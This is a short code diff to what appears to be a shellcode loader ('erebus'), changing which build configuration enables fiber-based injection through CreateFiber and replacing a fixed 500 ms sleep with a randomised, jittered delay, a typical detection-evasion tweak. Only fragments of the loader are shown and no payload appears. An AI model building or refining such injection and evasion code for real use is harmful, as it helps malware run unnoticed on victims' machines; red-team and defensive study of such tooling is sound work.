@@ -1,7 +1,7 @@
 #include "../../include/loader.hpp"
 
 namespace erebus {
-#if CONFIG_INJECTION_TYPE == 3
+#if CONFIG_INJECTION_TYPE == 2
 	VOID InjectionCreateFiber(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
 	{
 		LOG_INFO("Injection via. CreateFiber");
@@ -40,8 +40,8 @@ namespace erebus {
 		// Control returns here after shellcode completes
 		LOG_SUCCESS("Shellcode fiber execution completed");
 
-		// Give shellcode time to complete any async operations
-		Sleep(500);
+		// Jittered delay for async completion
+		Sleep(300 + (GetTickCount() % 400));
 
 		// Clean up the shellcode fiber
 		if (shellcode_fiber != NULL && shellcode_fiber != main_fiber)
